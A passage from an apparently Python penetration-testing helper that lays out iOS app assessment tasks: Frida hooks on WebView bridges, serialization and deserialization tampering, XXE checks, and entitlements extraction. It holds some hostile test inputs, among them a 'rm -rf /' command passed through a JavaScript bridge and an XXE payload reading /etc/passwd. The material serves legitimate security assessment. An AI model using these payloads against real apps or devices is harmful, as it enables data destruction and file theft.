                                'notes': 'Common vuln: Native method executes shell command with unsanitized JS input. Test: postMessage(["system", "rm -rf /"])'
                            }
                        },
                        {
                            'id': f'hook-js-bridge-{port}',
                            'name': 'Hook JavaScript Bridge',
                            'type': 'command',
                            'metadata': {
                                'command': f'frida -U -n TargetApp -l hook_wkwebview_bridge.js',
                                'description': 'Monitor all JavaScript-to-native bridge calls',
                                'tags': ['OSCP:HIGH', 'DYNAMIC'],
                                'flag_explanations': {
                                    '-U': 'Connect to USB device',
                                    '-n TargetApp': 'Attach to app process',
                                    '-l hook_wkwebview_bridge.js': 'Load Frida hook script'
                                },
                                'success_indicators': [
                                    'Bridge calls logged to console',
                                    'Handler names and arguments visible',
                                    'Return values captured'
                                ],
                                'failure_indicators': [
                                    'No bridge activity (may not be in use)',
                                    'App crash on hook',
                                    'Anti-Frida detection triggered'
                                ],
                                'next_steps': [
                                    'Analyze exposed methods for sensitive operations',
                                    'Test modifying arguments before native call',
                                    'Identify authentication/authorization checks',
                                    'Document all bridge methods for security review'
                                ],
                                'alternatives': [
                                    'Cycript: [WKUserContentController - addScriptMessageHandler:name:] hook',
                                    'Objection: ios hooking watch class WKScriptMessageHandler',
                                    'Custom Frida script for JSContext hooks'
                                ],
                                'notes': 'Hook script: Interceptor.attach(ObjC.classes.WKScriptMessageHandler["- userContentController:didReceiveScriptMessage:"].implementation, { onEnter: function(args) { console.log("Message:", ObjC.Object(args[3]).body()); } });'
                            }
                        }
                    ]
                },
                {
                    'id': f'dynamic-webview-analysis-{port}',
                    'name': 'Dynamic WebView Analysis',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'heap-inspection-webview-{port}',
                            'name': 'Heap Inspection - WebView Instances',
                            'type': 'command',
                            'metadata': {
                                'command': f'frida -U -n TargetApp -l webview_inspector.js',
                                'description': 'Find and inspect all WebView instances in app memory',
                                'tags': ['OSCP:HIGH', 'DYNAMIC'],
                                'flag_explanations': {
                                    'webview_inspector.js': 'Script using ObjC.choose() to find WebViews'
                                },
                                'success_indicators': [
                                    'WebView instances found on heap',
                                    'URLs and configurations logged',
                                    'JavaScript/secure content settings visible'
                                ],
                                'failure_indicators': [
                                    'No WebView instances (not loaded yet)',
                                    'App crash',
                                    'Frida not attached'
                                ],
                                'next_steps': [
                                    'Check javaScriptEnabled for each instance',
                                    'Verify hasOnlySecureContent property',
                                    'Inspect allowFileAccessFromFileURLs',
                                    'Log all loaded URLs'
                                ],
                                'alternatives': [
                                    'Cycript: choose(UIWebView) or choose(WKWebView)',
                                    'lldb: image lookup -r -s UIWebView',
                                    'Objection: ios ui dump (shows view hierarchy)'
                                ],
                                'notes': 'Script: ObjC.choose(ObjC.classes.WKWebView, { onMatch: function(wk) { console.log("URL:", wk.URL().toString()); console.log("JS:", wk.configuration().preferences().javaScriptEnabled()); } });'
                            }
                        },
                        {
                            'id': f'debug-webview-safari-{port}',
                            'name': 'Debug WebView with Safari Developer Tools',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Use Safari Web Inspector to debug WebView content',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'next_steps': [
                                    '1. iOS Device: Settings > Safari > Advanced > Enable Web Inspector',
                                    '2. Mac: Safari > Preferences > Advanced > Show Develop menu',
                                    '3. Connect iOS device via USB',
                                    '4. Launch target app with WebView',
                                    '5. Mac Safari: Develop > [Device Name] > [WebView Instance]',
                                    '6. Use Web Inspector to analyze content, JS, network'
                                ],
                                'success_indicators': [
                                    'Web Inspector connected to WebView',
                                    'Console.log() messages visible',
                                    'JavaScript debugging functional',
                                    'Network requests visible'
                                ],
                                'failure_indicators': [
                                    'WebView not shown in Develop menu (may be SFSafariViewController)',
                                    'App installed via App Store (only Xcode-loaded apps debuggable)',
                                    'Web Inspector not enabled'
                                ],
                                'alternatives': [
                                    'Chrome DevTools: No iOS support',
                                    'Frida: Inject console.log hooks',
                                    'Remote debugging: weinre tool'
                                ],
                                'notes': 'LIMITATION: Only works with apps loaded via Xcode, NOT App Store apps. Requires macOS + Safari.'
                            }
                        }
                    ]
                }
            ]
        }

    def _get_serialization_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Serialization and encoding security tasks"""
        return {
            'id': f'serialization-analysis-{port}',
            'name': 'Serialization & Encoding Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'identify-serialization-{port}',
                    'name': 'Identify Serialization Methods',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'find-nscoding-{port}',
                            'name': 'Find NSCoding Usage',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -i "NSCoding\\|encodeWithCoder\\|initWithCoder"',
                                'description': 'Detect NSCoding serialization (Objective-C object persistence)',
                                'tags': ['OSCP:MEDIUM', 'ENUM'],
                                'flag_explanations': {
                                    'NSCoding': 'Protocol for object serialization',
                                    'encodeWithCoder': 'Method to serialize object state',
                                    'initWithCoder': 'Initializer for deserialization'
                                },
                                'success_indicators': [
                                    'NSCoding protocol usage found',
                                    'Encoding/decoding methods identified',
                                    'Serializable classes detected'
                                ],
                                'failure_indicators': [
                                    'No matches (may use Swift Codable instead)',
                                    'Binary encrypted',
                                    'Modern app using only JSON'
                                ],
                                'next_steps': [
                                    'Check if NSSecureCoding used instead (more secure)',
                                    'Identify which classes implement NSCoding',
                                    'Test for insecure deserialization',
                                    'Check if sensitive data is serialized'
                                ],
                                'alternatives': [
                                    'class-dump: Find classes with NSCoding methods',
                                    'Source: grep -r "NSCoding" *.m',
                                    'Frida: Hook encodeWithCoder to see what gets serialized'
                                ],
                                'notes': 'NSCoding vulnerability: Attacker can inject data into existing objects during deserialization. NSSecureCoding fixes this by requiring type verification.'
                            }
                        },
                        {
                            'id': f'find-nssecurecoding-{port}',
                            'name': 'Find NSSecureCoding Usage',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -i "NSSecureCoding\\|supportsSecureCoding\\|decodeObjectOfClass"',
                                'description': 'Detect secure serialization with type verification',
                                'tags': ['OSCP:MEDIUM', 'ENUM'],
                                'flag_explanations': {
                                    'NSSecureCoding': 'Secure variant of NSCoding with type checking',
                                    'supportsSecureCoding': 'Property indicating secure deserialization',
                                    'decodeObjectOfClass': 'Type-safe decoding method'
                                },
                                'success_indicators': [
                                    'NSSecureCoding usage confirmed',
                                    'Type verification implemented',
                                    'Secure deserialization in place'
                                ],
                                'failure_indicators': [
                                    'Only NSCoding found (vulnerable)',
                                    'supportsSecureCoding returns false',
                                    'decodeObject used instead of decodeObjectOfClass'
                                ],
                                'next_steps': [
                                    'Verify supportsSecureCoding returns true',
                                    'Check if decodeObjectOfClass used instead of decodeObject',
                                    'Test deserialization with wrong class type',
                                    'Check for additional integrity protection (HMAC)'
                                ],
                                'alternatives': [
                                    'Source: Check if classes return true for supportsSecureCoding',
                                    'Runtime: [[MyClass class] supportsSecureCoding]',
                                    'Frida: Hook decoding methods'
                                ],
                                'notes': 'NSSecureCoding requires: 1) supportsSecureCoding = true, 2) decodeObjectOfClass:forKey: used instead of decodeObject:forKey:. Does NOT encrypt or sign data!'
                            }
                        },
                        {
                            'id': f'find-codable-{port}',
                            'name': 'Find Swift Codable Usage',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -i "Codable\\|Encodable\\|Decodable\\|JSONEncoder\\|PropertyListEncoder"',
                                'description': 'Detect Swift Codable serialization (modern approach)',
                                'tags': ['OSCP:MEDIUM', 'ENUM'],
                                'flag_explanations': {
                                    'Codable': 'Swift protocol combining Encodable + Decodable',
                                    'JSONEncoder': 'Serialize Swift objects to JSON',
                                    'PropertyListEncoder': 'Serialize to property list format'
                                },
                                'success_indicators': [
                                    'Codable types identified',
                                    'JSON/PropertyList encoding found',
                                    'Modern Swift serialization in use'
                                ],
                                'failure_indicators': [
                                    'No matches (Objective-C app)',
                                    'Binary heavily obfuscated',
                                    'Only NSCoding found'
                                ],
                                'next_steps': [
                                    'Identify which structs/classes are Codable',
                                    'Check what data is being serialized',
                                    'Test for sensitive data in serialized output',
                                    'Check if data is encrypted before storage'
                                ],
                                'alternatives': [
                                    'Source: grep -r "Codable" *.swift',
                                    'nm: Find JSONEncoder/Decoder symbols',
                                    'Runtime: Monitor JSONEncoder.encode() calls'
                                ],
                                'notes': 'Codable is Swift-native (cleaner than NSCoding). Automatically handles String, Int, Double, Array, Dictionary. Check for sensitive data in encoded output!'
                            }
                        },
                        {
                            'id': f'find-nskeyedarchiver-{port}',
                            'name': 'Find NSKeyedArchiver Usage',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -i "NSKeyedArchiver\\|archiveRootObject\\|NSKeyedUnarchiver\\|unarchiveObject"',
                                'description': 'Detect archiving to files (object persistence)',
                                'tags': ['OSCP:HIGH', 'ENUM'],
                                'flag_explanations': {
                                    'NSKeyedArchiver': 'Encodes objects to NSData/files',
                                    'archiveRootObject:toFile:': 'Save object to file',
                                    'NSKeyedUnarchiver': 'Restores objects from archive',
                                    'unarchiveObjectWithFile:': 'Load object from file'
                                },
                                'success_indicators': [
                                    'Object archiving to files detected',
                                    'Archive file paths identified',
                                    'Persistent object storage found'
                                ],
                                'failure_indicators': [
                                    'No file archiving (in-memory only)',
                                    'Modern app using JSON files instead',
                                    'No matches'
                                ],
                                'next_steps': [
                                    'Find archive file locations on filesystem',
                                    'Extract and analyze archive contents',
                                    'Check for sensitive data in archives',
                                    'Test tampering with archived files',
                                    'Verify encryption of archived data'
                                ],
                                'alternatives': [
                                    'Source: grep -r "archiveRootObject" *.m',
                                    'Runtime: Hook NSKeyedArchiver to log file paths',
                                    'find /var/mobile -name "*.archive" -o -name "*.plist"'
                                ],
                                'notes': 'Archives often stored in Documents/ or Library/. Check for: 1) Sensitive data exposure, 2) No encryption, 3) Tamper potential (lack of HMAC)'
                            }
                        }
                    ]
                },
                {
                    'id': f'test-serialization-security-{port}',
                    'name': 'Test Serialization Security',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'find-serialized-files-{port}',
                            'name': 'Find Serialized Data Files',
                            'type': 'command',
                            'metadata': {
                                'command': f'ssh root@{target} "find /var/mobile/Containers/Data/Application -name \'*.plist\' -o -name \'*.archive\' -o -name \'*.dat\' 2>/dev/null"',
                                'description': 'Locate potential serialized data files in app containers',
                                'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL'],
                                'flag_explanations': {
                                    'find': 'Search filesystem',
                                    '-name \'*.plist\'': 'Property list files (common serialization format)',
                                    '-o': 'OR operator (match any pattern)',
                                    '2>/dev/null': 'Suppress permission errors'
                                },
                                'success_indicators': [
                                    'Archive/plist files found',
                                    'File paths identified',
                                    'Potential serialized data located'
                                ],
                                'failure_indicators': [
                                    'No files found',
                                    'Permission denied',
                                    'App uses database instead'
                                ],
                                'next_steps': [
                                    'Extract files: scp root@device:/path/to/file .',
                                    'Analyze with plutil: plutil -p file.plist',
                                    'Unarchive: NSKeyedUnarchiver.unarchiveObjectWithFile',
                                    'Check for sensitive data (passwords, tokens, PII)'
                                ],
                                'alternatives': [
                                    'iFunBox: Browse app container manually',
                                    'iExplorer: File browser for iOS',
                                    'objection: ios plist cat /path/to/file.plist'
                                ],
                                'notes': 'Common locations: Documents/, Library/Caches/, Library/Preferences/, tmp/. Check for credentials, session tokens, personal data.'
                            }
                        },
                        {
                            'id': f'analyze-serialized-content-{port}',
                            'name': 'Analyze Serialized Data Content',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Review serialized data for sensitive information',
                                'tags': ['OSCP:HIGH', 'MANUAL'],
                                'next_steps': [
                                    '1. Extract serialized files from device',
                                    '2. Convert binary plists: plutil -convert xml1 file.plist',
                                    '3. Search for sensitive patterns: grep -i "password\\|token\\|secret\\|key\\|credit"',
                                    '4. Check for personal data (PII): names, emails, addresses',
                                    '5. Verify encryption (should be encrypted at rest)',
                                    '6. Test tamper protection (HMAC/signature)'
                                ],
                                'success_indicators': [
                                    'No sensitive data in plaintext',
                                    'Data properly encrypted',
                                    'Integrity protection (HMAC) present'
                                ],
                                'failure_indicators': [
                                    'Passwords/tokens in plaintext',
                                    'Personal data unencrypted',
                                    'No tamper protection',
                                    'Session tokens persisted'
                                ],
                                'alternatives': [
                                    'strings file.archive | grep -i password',
                                    'hexdump -C file.dat | less',
                                    'Python: plistlib.load() to parse plists'
                                ],
                                'notes': 'CRITICAL: Serialized data often contains sensitive info. Check: 1) Encryption, 2) HMAC/signature, 3) Appropriate storage location (Keychain vs file)'
                            }
                        },
                        {
                            'id': f'test-deserialization-attack-{port}',
                            'name': 'Test Insecure Deserialization',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Test for deserialization vulnerabilities (object injection)',
                                'tags': ['OSCP:HIGH', 'MANUAL', 'VULN'],
                                'next_steps': [
                                    '1. Identify archived files loaded by app',
                                    '2. Extract file and decode structure',
                                    '3. Modify serialized object (add malicious properties)',
                                    '4. If NSCoding: Inject unexpected object types',
                                    '5. If NSSecureCoding: Test type verification bypass',
                                    '6. Replace file on device and restart app',
                                    '7. Monitor for crashes, unexpected behavior, code execution'
                                ],
                                'success_indicators': [
                                    'NSSecureCoding properly validates types',
                                    'Modified archive rejected',
                                    'No code execution from malicious data',
                                    'HMAC verification prevents tampering'
                                ],
                                'failure_indicators': [
                                    'NSCoding accepts injected objects',
                                    'No type verification',
                                    'Modified data processed without validation',
                                    'App crashes (DoS)',
                                    'Potential code execution'
                                ],
                                'alternatives': [
                                    'Burp Suite: Intercept serialized data in transit',
                                    'Frida: Hook unarchive methods and modify data',
                                    'Python script to modify archives'
                                ],
                                'notes': 'Classic iOS vuln: NSCoding allows type confusion. NSSecureCoding fixes this but does NOT encrypt or sign! Always add HMAC for integrity.'
                            }
                        },
                        {
                            'id': f'hook-serialization-{port}',
                            'name': 'Hook Serialization Methods',
                            'type': 'command',
                            'metadata': {
                                'command': f'frida -U -n TargetApp -l hook_serialization.js',
                                'description': 'Monitor all serialization/deserialization at runtime',
                                'tags': ['OSCP:HIGH', 'DYNAMIC'],
                                'flag_explanations': {
                                    'hook_serialization.js': 'Hook encode/decode methods'
                                },
                                'success_indicators': [
                                    'Encode/decode calls logged',
                                    'Data being serialized visible',
                                    'File paths and object types captured'
                                ],
                                'failure_indicators': [
                                    'No serialization activity',
                                    'App crash on hook',
                                    'Anti-Frida detection'
                                ],
                                'next_steps': [
                                    'Identify what data is being serialized',
                                    'Check for sensitive info in serialized objects',
                                    'Note file paths for later extraction',
                                    'Test modifying objects before encoding'
                                ],
                                'alternatives': [
                                    'Cycript: Hook NSKeyedArchiver methods',
                                    'lldb: Breakpoint on archiveRootObject',
                                    'dtrace: Monitor file I/O'
                                ],
                                'notes': 'Hook targets: NSKeyedArchiver.archiveRootObject:toFile:, NSKeyedUnarchiver.unarchiveObjectWithFile:, JSONEncoder.encode, PropertyListEncoder.encode'
                            }
                        }
                    ]
                },
                {
                    'id': f'check-thirdparty-serialization-{port}',
                    'name': 'Check Third-Party Serialization',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'find-json-libraries-{port}',
                            'name': 'Find JSON Libraries',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -iE "JSONSerialization|SwiftyJSON|ObjectMapper|Codable"',
                                'description': 'Identify JSON serialization libraries in use',
                                'tags': ['OSCP:MEDIUM', 'ENUM'],
                                'flag_explanations': {
                                    'JSONSerialization': 'Native iOS JSON parsing',
                                    'SwiftyJSON': 'Popular third-party JSON library',
                                    'ObjectMapper': 'Object-to-JSON mapping library',
                                    'Codable': 'Swift native JSON support'
                                },
                                'success_indicators': [
                                    'JSON libraries identified',
                                    'Serialization approach understood',
                                    'Potential vulnerability vectors known'
                                ],
                                'failure_indicators': [
                                    'No JSON usage (unlikely)',
                                    'Binary obfuscated',
                                    'Only property lists used'
                                ],
                                'next_steps': [
                                    'Check library versions for vulnerabilities',
                                    'Review how JSON data is validated',
                                    'Test for JSON injection',
                                    'Check for XXE if XML parsing present'
                                ],
                                'alternatives': [
                                    'Source: Check Podfile/Package.swift',
                                    'nm: List library symbols',
                                    'jtool2: Show linked frameworks'
                                ],
                                'notes': 'JSON generally safe, but check: 1) Input validation, 2) Type confusion, 3) Large payload DoS'
                            }
                        },
                        {
                            'id': f'find-xml-libraries-{port}',
                            'name': 'Find XML Parsing Libraries',
                            'type': 'command',
                            'metadata': {
                                'command': f'rabin2 -zz /path/to/AppBinary | grep -iE "NSXMLParser|libxml2|XMLDocument|XMLReader"',
                                'description': 'Identify XML parsing (potential XXE vulnerability)',
                                'tags': ['OSCP:HIGH', 'ENUM', 'VULN'],
                                'flag_explanations': {
                                    'NSXMLParser': 'Native iOS XML parser',
                                    'libxml2': 'Low-level XML library (can be vulnerable)',
                                    'XMLDocument': 'macOS/iOS XML document parsing',
                                    'XMLReader': 'Third-party XML library'
                                },
                                'success_indicators': [
                                    'XML parsing libraries found',
                                    'Potential XXE risk identified',
                                    'External entity processing detected'
                                ],
                                'failure_indicators': [
                                    'No XML parsing (JSON-only app)',
                                    'SAX parser used (safer)',
                                    'External entities disabled'
                                ],
                                'next_steps': [
                                    'Check if external entity processing is disabled',
                                    'Test XXE payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                                    'Check for DTD processing',
                                    'Test XXE via API requests'
                                ],
                                'alternatives': [
                                    'Source: Check XML parser configuration',
                                    'grep for shouldResolveExternalEntities',
                                    'Burp Suite: Inject XXE payloads'
                                ],
                                'notes': 'XXE CRITICAL VULN: Disable external entities: parser.shouldResolveExternalEntities = NO. libxml2 requires explicit disable: XML_PARSE_NOENT flag.'
                            }
                        }
                    ]
                }
            ]
        }

    def _get_entitlements_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Entitlements extraction and analysis"""
        return {
            'id': f'entitlements-analysis-{port}',
            'name': 'Entitlements Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': f'extract-entitlements-binary-{port}',
                    'name': 'Extract Entitlements from Binary',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'binwalk-extract-xml-{port}',
                            'name': 'Extract XML with Binwalk',
                            'type': 'command',
                            'metadata': {
                                'command': 'binwalk -e -y=xml /path/to/AppBinary',
                                'description': 'Extract all embedded XML files (including entitlements)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'flag_explanations': {
                                    'binwalk': 'Firmware analysis tool (extracts embedded files)',
                                    '-e': 'Extract files found',
                                    '-y=xml': 'Only extract XML files'
                                },
                                'success_indicators': [
                                    'XML documents extracted',
                                    'Entitlements plist found',
                                    'PropertyList structure visible'
                                ],
                                'failure_indicators': [
                                    'No XML found (binary may be stripped)',
                                    'Binary encrypted (decrypt first)',
                                    'binwalk not installed'
                                ],
                                'next_steps': [
                                    'Review extracted XML files in _AppBinary.extracted/',
                                    'Look for entitlements PropertyList',
                                    'Analyze permissions and capabilities',
                                    'Compare with mobileprovision file'
                                ],
                                'alternatives': [
                                    'radare2: r2 -qc \'izz~PropertyList\' AppBinary',
                                    'grep: grep -a "PropertyList" AppBinary',
                                    'strings + grep: strings AppBinary | grep -A 20 "<!DOCTYPE plist"'
                                ],
                                'notes': 'Works on encrypted binaries too! Binwalk extracts embedded files regardless of encryption (entitlements in cleartext).'
                            }
                        },
                        {
                            'id': f'radare2-extract-plist-{port}',
                            'name': 'Extract with Radare2',
                            'type': 'command',
                            'metadata': {
                                'command': 'r2 -qc \'izz~PropertyList\' /path/to/AppBinary',
                                'description': 'Search binary for PropertyList strings (entitlements)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'flag_explanations': {
                                    'r2': 'Radare2 reverse engineering framework',
                                    '-q': 'Quiet mode (suppress banner)',
                                    '-c': 'Run command and exit',
                                    'izz': 'List all strings in binary',
                                    '~PropertyList': 'Filter for PropertyList (grep-like)'
                                },
                                'success_indicators': [
                                    'PropertyList XML found',
                                    'Memory offsets displayed',
                                    'Entitlements structure visible'
                                ],
                                'failure_indicators': [
                                    'No matches',
                                    'Binary encrypted',
                                    'radare2 not installed'
                                ],
                                'next_steps': [
                                    'Extract full XML: r2 -qc \'s OFFSET; px 2000\' AppBinary',
                                    'Convert hex to text',
                                    'Analyze entitlements',
                                    'Check for sensitive capabilities'
                                ],
                                'alternatives': [
                                    'rabin2 -zz AppBinary | grep PropertyList',
                                    'strings -a -t x AppBinary | grep PropertyList',
                                    'ghex: Open in hex editor and search'
                                ],
                                'notes': 'Get offset then extract: r2 -qc \'s 0x15d2a4; pxq 500\' AppBinary (use offset from izz output)'
                            }
                        },
                        {
                            'id': f'grep-extract-entitlements-{port}',
                            'name': 'Extract with Grep (Jailbroken Device)',
                            'type': 'command',
                            'metadata': {
                                'command': f'ssh root@{target} "grep -a -A 50 \'PropertyList\' /var/containers/Bundle/Application/*/AppBinary"',
                                'description': 'Extract entitlements directly from device binary',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                                'flag_explanations': {
                                    'grep': 'Search for text patterns',
                                    '-a': 'Treat binary file as text (process all bytes)',
                                    '-A 50': 'Show 50 lines after match (context)',
                                    'PropertyList': 'String indicating plist XML'
                                },
                                'success_indicators': [
                                    'Entitlements XML displayed',
                                    'Complete plist structure visible',
                                    'Permissions and capabilities shown'
                                ],
                                'failure_indicators': [
                                    'No matches',
                                    'Permission denied (use root)',
                                    'Binary encrypted'
                                ],
                                'next_steps': [
                                    'Parse entitlements from output',
                                    'Check for dangerous capabilities',
                                    'Compare with app description/documentation',
                                    'Look for overprivileged entitlements'
                                ],
                                'alternatives': [
                                    'strings AppBinary | grep -A 50 PropertyList',
                                    'cat AppBinary | strings | grep -A 50 "<!DOCTYPE plist"',
                                    'dd if=AppBinary | strings | grep PropertyList'
                                ],
                                'notes': 'Works on ENCRYPTED binaries (entitlements not encrypted)! Adjust -A value if plist truncated.'
                            }
                        }
                    ]
                },
                {
                    'id': f'extract-mobileprovision-{port}',
                    'name': 'Extract Mobile Provision File',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'find-mobileprovision-{port}',
                            'name': 'Find embedded.mobileprovision',
                            'type': 'command',
                            'metadata': {
                                'command': f'ssh root@{target} "find /var/containers/Bundle/Application -name embedded.mobileprovision"',
                                'description': 'Locate provisioning profile in app bundle',
                                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'MANUAL'],
                                'flag_explanations': {
                                    'embedded.mobileprovision': 'Provisioning profile containing entitlements, signing info, devices'
                                },
                                'success_indicators': [
                                    'Provisioning profile path found',
                                    'File located in app bundle',
                                    'Ready for extraction'
                                ],
                                'failure_indicators': [
                                    'No profile found (sideloaded apps may lack it)',
                                    'Permission denied',
                                    'App not installed'
                                ],
                                'next_steps': [
                                    'Extract file: scp root@device:/path/to/embedded.mobileprovision .',
                                    'Decode with security cms -D',
                                    'Parse entitlements from profile',
                                    'Check expiration date'
                                ],
                                'alternatives': [
                                    'iFunBox: Browse to App.app/embedded.mobileprovision',
                                    'Xcode: Window > Devices > Installed Apps > Download Container',
                                    'Decrypt IPA and check app bundle'
                                ],
                                'notes': 'embedded.mobileprovision = PKCS#7 signed XML. Contains: entitlements, certificates, provisioning profile info, allowed devices.'
                            }
                        },
                        {
                            'id': f'decode-mobileprovision-{port}',
                            'name': 'Decode Provisioning Profile',
                            'type': 'command',
                            'metadata': {
                                'command': 'security cms -D -i embedded.mobileprovision',
                                'description': 'Decode PKCS#7 signed provisioning profile to XML',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'flag_explanations': {
                                    'security': 'macOS security command-line tool',
                                    'cms': 'Cryptographic Message Syntax operations',
                                    '-D': 'Decode CMS message',
                                    '-i': 'Input file'
                                },
                                'success_indicators': [
                                    'XML plist output',
                                    'Entitlements dict visible',
                                    'Provisioning data decoded'
                                ],
                                'failure_indicators': [
                                    'Invalid CMS message',
                                    'File corrupted',
                                    'security tool not available (not on macOS)'
                                ],
                                'next_steps': [
                                    'Extract Entitlements dictionary',
                                    'Check ApplicationIdentifier',
                                    'Review Team Identifier',
                                    'Check ProvisionedDevices (if present)',
                                    'Verify ExpirationDate'
                                ],
                                'alternatives': [
                                    'openssl smime -inform der -verify -noverify -in embedded.mobileprovision',
                                    'Online: Copy binary to Mac with security tool',
                                    'Python: M2Crypto library to parse PKCS#7'
                                ],
                                'notes': 'Output to file: security cms -D -i embedded.mobileprovision -o profile.plist. Check ExpirationDate to see if still valid.'
                            }
                        },
                        {
                            'id': f'extract-entitlements-from-profile-{port}',
                            'name': 'Extract Entitlements from Profile',
                            'type': 'command',
                            'metadata': {
                                'command': 'security cms -D -i embedded.mobileprovision | plutil -extract Entitlements xml1 -o - --',
                                'description': 'Extract just the Entitlements dictionary from profile',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'flag_explanations': {
                                    'security cms -D': 'Decode provisioning profile',
                                    '|': 'Pipe output to next command',
                                    'plutil -extract': 'Extract specific key from plist',
                                    'Entitlements': 'Dictionary key containing app entitlements',
                                    'xml1': 'Output format (XML)',
                                    '-o -': 'Output to stdout',
                                    '--': 'Read from stdin'
                                },
                                'success_indicators': [
                                    'Entitlements XML displayed',
                                    'Only relevant entitlements shown',
                                    'Clean, readable output'
                                ],
                                'failure_indicators': [
                                    'Key not found (malformed profile)',
                                    'plutil error',
                                    'Empty output'
                                ],
                                'next_steps': [
                                    'Review all entitlements for security implications',
                                    'Check for excessive permissions',
                                    'Compare with app functionality',
                                    'Document for penetration test report'
                                ],
                                'alternatives': [
                                    'Manual: Decode profile and parse XML manually',
                                    'Python: plistlib to extract Entitlements key',
                                    'xmllint: Use XPath to extract specific elements'
                                ],
                                'notes': 'Save to file: ...plutil -extract Entitlements xml1 -o entitlements.plist --'
                            }
                        }
                    ]
                },
                {
                    'id': f'analyze-entitlements-{port}',
                    'name': 'Analyze Entitlements Security',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'check-app-groups-entitlement-{port}',
                            'name': 'Check App Groups Entitlement',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Review com.apple.security.application-groups for data sharing',
                                'tags': ['OSCP:HIGH', 'MANUAL'],
                                'next_steps': [
                                    '1. Look for: <key>com.apple.security.application-groups</key>',
                                    '2. Note all group identifiers (group.com.company.*)',
                                    '3. Check if multiple apps/extensions share groups',
                                    '4. Review shared container for sensitive data',
                                    '5. Verify encryption of shared data'
                                ],
                                'success_indicators': [
                                    'Appropriate app groups for functionality',
                                    'Sensitive data not in shared containers',
                                    'Shared data properly encrypted'
                                ],
                                'failure_indicators': [
                                    'Excessive app groups',
                                    'Credentials in shared UserDefaults',
                                    'Personal data shared with extensions',
                                    'No encryption on shared data'
                                ],
                                'alternatives': [
                                    'grep: grep -A 5 application-groups entitlements.plist',
                                    'xmllint: Extract specific entitlement',
                                    'plutil: plutil -p entitlements.plist'
                                ],
                                'notes': 'App Groups allow data sharing between app and extensions. Security risk: Sensitive data accessible by all group members!'
                            }
                        },
                        {
                            'id': f'check-keychain-entitlements-{port}',
                            'name': 'Check Keychain Access Groups',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Review keychain-access-groups for shared keychain access',
                                'tags': ['OSCP:HIGH', 'MANUAL'],
                                'next_steps': [
                                    '1. Look for: <key>keychain-access-groups</key>',
                                    '2. Note all access groups',
                                    '3. Check if shared with other apps (same Team ID prefix)',
                                    '4. Review keychain items stored',
                                    '5. Verify appropriate access control flags'
                                ],
                                'success_indicators': [
                                    'Keychain groups scoped to app only',
                                    'No unnecessary sharing',
                                    'Access control flags set (kSecAttrAccessible)'
                                ],
                                'failure_indicators': [
                                    'Keychain shared across multiple apps',
                                    'No access control',
                                    'Sensitive data accessible when device locked'
                                ],
                                'alternatives': [
                                    'grep: grep -A 5 keychain-access-groups entitlements.plist',
                                    'Source: Check kSecAttrAccessGroup in code',
                                    'Runtime: Dump keychain items'
                                ],
                                'notes': 'Keychain groups format: $(AppIdentifierPrefix).com.company.app. Shared keychain = security risk if other apps compromised!'
                            }
                        },
                        {
                            'id': f'check-network-entitlements-{port}',
                            'name': 'Check Network Entitlements',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Review network-related entitlements (VPN, Personal VPN, etc.)',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'next_steps': [
                                    '1. Check: com.apple.developer.networking.vpn.api',
                                    '2. Check: com.apple.developer.networking.networkextension',
                                    '3. Check: com.apple.developer.networking.wifi-info',
                                    '4. Check: com.apple.developer.networking.multipath',
                                    '5. Verify entitlements match app functionality'
                                ],
                                'success_indicators': [
                                    'Network entitlements appropriate for app purpose',
                                    'No excessive permissions',
                                    'VPN entitlement only if VPN app'
                                ],
                                'failure_indicators': [
                                    'Unnecessary network entitlements',
                                    'Overprivileged network access',
                                    'VPN capability in non-VPN app'
                                ],
                                'alternatives': [
                                    'grep: grep -i networking entitlements.plist',
                                    'Review: Check app description vs entitlements',
                                    'Compare: Similar apps entitlements'
                                ],
                                'notes': 'Network extension entitlements = powerful! Can intercept all network traffic. Should only be in VPN/filtering apps.'
                            }
                        },
                        {
                            'id': f'check-dangerous-entitlements-{port}',
                            'name': 'Check for Dangerous Entitlements',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Identify high-risk entitlements that may be abused',
                                'tags': ['OSCP:HIGH', 'MANUAL'],
                                'next_steps': [
                                    '1. get-task-allow: Debug entitlement (should be false for production)',
                                    '2. task_for_pid-allow: Process inspection (private)',
                                    '3. run-unsigned-code: Allow unsigned code execution',
                                    '4. com.apple.private.*: Private entitlements (suspicious)',
                                    '5. dynamic-codesigning: Runtime code modification'
                                ],
                                'success_indicators': [
                                    'get-task-allow = false (production build)',
                                    'No private entitlements',
